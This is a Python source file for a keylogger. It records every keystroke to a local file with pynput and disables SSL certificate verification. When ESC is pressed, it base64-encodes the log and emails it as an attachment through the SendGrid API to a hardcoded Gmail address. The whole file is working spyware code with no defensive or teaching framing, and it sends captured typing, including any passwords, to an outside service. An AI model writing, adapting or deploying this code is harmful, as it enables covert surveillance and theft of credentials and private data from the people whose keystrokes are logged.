import base64, pynput, sendgrid, os, ssl
from pynput.keyboard import Key, Listener
from sendgrid.helpers.mail import Mail, Attachment, FileContent, FileName, FileType, Disposition

# File to log the typed keys
log_file = "keylog.txt"

# Create an unverified SSL context
ssl._create_default_https_context = ssl._create_unverified_context

# SendGrid API configuration
SENDGRID_API_KEY = '*'
SENDGRID_FROM_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_TO_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_SUBJECT = "Log File"
SENDGRID_BODY = "Here is the log file with the recorded keystrokes."

# Function to write the keys to the log file handling the special cases
def write_to_file(key):
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        elif key == Key.backspace:
            file.write(" [BACKSPACE] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.ctrl:
            file.write(" [CTRL] ")
        elif key == Key.cmd: 
            file.write(" [CMD] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.caps_lock:
            file.write(" [CAPSLOCK] ")
        elif key == Key.alt:
            file.write(" [ALT] ")
        elif key == Key.esc:
            file.write(" [ESC] ")
        else:
            file.write(key_data)

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener if ESC is pressed
        send_email_with_sendgrid();
        return False

# Function called in order to send email
def send_email_with_sendgrid():
    sg = sendgrid.SendGridAPIClient(api_key=SENDGRID_API_KEY)
    
    message = Mail(
        from_email=SENDGRID_FROM_EMAIL,
        to_emails=SENDGRID_TO_EMAIL,
        subject=SENDGRID_SUBJECT,
        plain_text_content=SENDGRID_BODY
    )

    # Attach the log file
    with open(log_file, 'rb') as f:
        file_data = f.read()
    encoded_file = base64.b64encode(file_data).decode()

    attachment = Attachment(
        FileContent(encoded_file),
        FileName('keylog.txt'),
        FileType('text/plain'),
        Disposition('attachment')
    )
    message.attachment = attachment

    try:
        response = sg.send(message)
        print(f"Email sent successfully! Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Setup the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
